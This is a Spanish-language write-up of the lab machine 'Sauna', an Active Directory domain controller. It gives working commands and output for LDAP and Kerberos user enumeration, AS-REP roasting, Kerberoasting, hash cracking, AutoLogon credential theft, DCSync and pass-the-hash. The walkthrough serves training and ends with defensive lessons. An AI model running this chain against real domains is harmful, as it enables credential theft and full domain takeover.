---
title: "Sauna (Easy)"
date: 2026-11-07
author: "Isma"
slug: "sauna"
tags: ["Windows", "AD", "LDAP", "AS-REP Roasting", "Hash Cracking", "AutoLogon", "BloodHound", "DCSync", "Pass-the-Hash"]
categories: ["Machine"]
draft: false
source: "obsidian"
---

## Resumen

Sauna es un controlador de dominio Windows de un banco ficticio (*Egotistical Bank*). Es una máquina muy didáctica para practicar ataques clásicos de Active Directory: obtengo un nombre de empleado por LDAP anónimo, genero posibles nombres de usuario y los valido con **kerbrute**. Uno de ellos no requiere preautenticación Kerberos, lo que permite un **AS-REP Roasting** y crackear su contraseña. Ya dentro, **WinPEAS** revela credenciales de **AutoLogon** de una cuenta de servicio que, según **BloodHound**, tiene permisos de replicación sobre el dominio. Con ellos hago un **DCSync**, extraigo el hash de `Administrator` y entro con **Pass-the-Hash**.

## Reconocimiento

Empiezo con un escaneo de puertos:

```powershell
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-01-03 18:35:30Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m01s
```

Es un **controlador de dominio** del dominio `EGOTISTICAL-BANK.LOCAL`, con una web en IIS y WinRM abierto. Me apunto el `clock-skew` de **7 horas**: con Kerberos eso dará problemas más adelante.

### Web (puerto 80)

La web es la página corporativa del banco. Lo más útil es la sección del equipo, que muestra nombres reales de empleados que puedo usar para construir posibles nombres de usuario.

![sauna](/images/obsidian/sauna/image-1183.png)

### SMB (puerto 445)

La sesión nula se acepta, pero no permite listar recursos, y la cuenta `guest` está deshabilitada:

```bash
smbclient -N -L //10.129.95.180/
nxc smb 10.129.95.180 -u 'guest' -p '' --shares
```

```
SMB  10.129.95.180  445  SAUNA  [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB  10.129.95.180  445  SAUNA  [-] EGOTISTICAL-BANK.LOCAL\guest: STATUS_ACCOUNT_DISABLED
```

### LDAP anónimo

LDAP sí permite consultas anónimas sobre la raíz del dominio:

```bash
ldapsearch -H ldap://10.129.95.180 -x -b "DC=EGOTISTICAL-BANK,DC=LOCAL"
```

Entre la información del dominio (política de contraseñas, `ms-DS-MachineAccountQuota: 10`, etc.) aparece un objeto de usuario:

```
# Hugo Smith, EGOTISTICAL-BANK.LOCAL
dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
```

Ya tengo un nombre real: **Hugo Smith**.

### Enumeración de usuarios con kerbrute

Sin saber el formato de los nombres de usuario, uso la lista `jsmith.txt` de *statistically-likely-usernames* (formato inicial + apellido) y la valido contra Kerberos. Kerbrute aprovecha que el KDC responde de forma distinta si el usuario existe o no:

```bash
kerbrute userenum -d egotistical-bank.local --dc 10.129.95.180 jsmith.txt
```

```
[+] VALID USERNAME:       hsmith@egotistical-bank.local
[+] VALID USERNAME:       fsmith@egotistical-bank.local
```

Dos usuarios válidos: `hsmith` (Hugo Smith) y `fsmith` (Fergus Smith, que aparece en la web).

## Acceso Inicial (Foothold)

### AS-REP Roasting

Si una cuenta tiene activado **"Do not require Kerberos preauthentication"** (`DONT_REQ_PREAUTH`), cualquiera puede pedir un TGT en su nombre sin conocer la contraseña. La respuesta del KDC (AS-REP) va cifrada con una clave derivada de la contraseña del usuario, así que se puede crackear offline. No hace falta ninguna credencial: basta con una lista de usuarios.

```bash
impacket-GetNPUsers egotistical-bank.local/fsmith -no-pass -dc-ip 10.129.95.180
```

```
[*] Getting TGT for fsmith
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:ef8269b523e64d99b94cfce2322a6461$2447561...a04cf
```

`fsmith` es vulnerable. Crackeo el hash con hashcat (modo `18200`):

```bash
hashcat -m 18200 fsmith.txt /usr/share/wordlists/rockyou.txt
```

```
fsmith : Thestrokes23
```

Con estas credenciales entro por WinRM y capturo la **User Flag**.

```bash
evil-winrm -i 10.129.95.180 -u fsmith -p 'Thestrokes23'
```

### Enumeración autenticada

Con un usuario del dominio enumero SMB y usuarios. Destacan una impresora compartida (`RICOH Aficio SP 8300DN PCL 6`) y una cuenta de servicio llamada **`svc_loanmgr`**:

![sauna](/images/obsidian/sauna/image-1184.png)

![sauna](/images/obsidian/sauna/image-1185.png)

### Kerberoasting de hsmith

`hsmith` tiene un SPN asociado, así que pruebo **Kerberoasting**. El primer intento falla con `KRB_AP_ERR_SKEW` por la diferencia horaria que vi en el escaneo; lo soluciono sincronizando el reloj con el DC:

```bash
sudo ntpdate 10.129.95.180
impacket-GetUserSPNs -dc-ip 10.129.95.180 EGOTISTICAL-BANK.LOCAL/fsmith -request
```

![sauna](/images/obsidian/sauna/image-1186.png)

Al crackear el TGS resulta que `hsmith` **reutiliza la misma contraseña** que `fsmith` (`Thestrokes23`), aunque no tiene acceso por WinRM, así que no me aporta un vector nuevo.

![sauna](/images/obsidian/sauna/image-1187.png)

## Escalada de Privilegios

### Credenciales de AutoLogon con WinPEAS

Subo **WinPEAS** a la sesión de `fsmith` para buscar vectores de escalada:

![sauna](/images/obsidian/sauna/image-1188.png)

En la sección *Winlogon Credentials* aparecen credenciales de **AutoLogon** guardadas en el registro (`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`):

![sauna](/images/obsidian/sauna/image-1189.png)

```
svc_loanmanager : Moneymakestheworldgoround!
```

El nombre en el registro es `svc_loanmanager`, pero la cuenta real del dominio es **`svc_loanmgr`** (la que vi al enumerar usuarios).

### BloodHound: permisos de DCSync

BloodHound en remoto no me funcionaba, así que ejecuto **SharpHound** dentro de la máquina y analizo el resultado. La cuenta `svc_loanmgr` tiene los permisos **GetChanges** y **GetChangesAll** (`DS-Replication-Get-Changes-All`) sobre el dominio:

![sauna](/images/obsidian/sauna/image-1190.png)

Esos permisos permiten un **DCSync**: abusar del protocolo de replicación entre controladores de dominio (MS-DRSR) para hacerse pasar por un DC y pedir los secretos de cualquier cuenta, incluidos los hashes NTLM.

### DCSync y Pass-the-Hash

```bash
impacket-secretsdump -just-dc egotistical-bank.local/svc_loanmgr@10.129.95.180
```

![sauna](/images/obsidian/sauna/image-1191.png)

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
```

Con el hash NT de `Administrator` no necesito crackear nada: me autentico directamente con **Pass-the-Hash**.

```bash
evil-winrm -i 10.129.95.180 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```

![sauna](/images/obsidian/sauna/image-1192.png)

Máquina comprometida y **Root Flag** capturada.

## Conclusiones

| | **AS-REP Roasting** (GetNPUsers) | **Kerberoasting** (GetUserSPNs) |
|---|---|---|
| **Requisito** | Lista de nombres de usuario | Una cuenta válida del dominio |
| **Frecuencia** | Poco común (mala configuración) | Muy común (inherente a AD) |
| **Objetivo** | Usuarios sin preautenticación | Cuentas de servicio con SPN |
| **Fase** | Acceso inicial | Movimiento lateral / escalada |

- Ninguna cuenta debería tener desactivada la preautenticación Kerberos.
- Las credenciales de AutoLogon se guardan en texto claro en el registro, y aquí correspondían a una cuenta con derechos de replicación: con eso basta para comprometer el dominio entero.
